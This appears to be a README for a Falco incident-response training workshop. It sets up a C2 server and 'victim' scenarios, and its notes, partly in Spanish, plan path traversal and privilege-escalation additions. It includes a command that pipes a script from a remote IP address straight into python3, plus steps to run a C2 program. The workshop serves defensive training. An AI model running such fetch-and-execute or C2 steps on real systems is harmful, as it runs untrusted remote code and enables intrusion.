# README



## Requirements

Golang 1.21 or newer and Python 3.7 or later are required.



## trin
    Adjust de go versions.

    go version

    Validate the project versions

    go list -m -versions github.com/diego-all/falco-workshop


## Installation


**In Kubernetes**

    kubectl apply -f k8s/victim-workshop.yaml

**In Containers**

    docker run -it --name falco-workshop -h training diegoall1990/falco-workshop:tagname (Cooming soon)


## Execution


In C2 Server (peregrinus) execute:


    cd /root
    python3 -m http.server 80

    go run peregrinus.go



In victim machine execute:


    curl -sL http://34.27.180.215:8080/sitio/vuelta.txt | python3


    go run github.com/diego-all/falco-workshop@latest init --vector A
    go run main.go init --vector A

    go run github.com/diego-all/falco-workshop@v0.1.1 init --vector A

    go run github.com/diego-all/falco-workshop@latest init --interactive
    go run main.go init --interactive
    


Esta diseñada para Ubuntu (de la imagen) 

Propone 2 escenarios de incidentes con con fin de concientizar y capacitar al equipo de IRT de Random para realizar
investigaciones relacionadas a eventos de seguridad generados por Falco.


Montar la API en esta version de ubuntu.


La de path traversal no tiene sentido en este vector no hay una app nueva y no hay un RCE.
Inventar montar el path delpath traversal con la API.

Anexarle algo de privesc.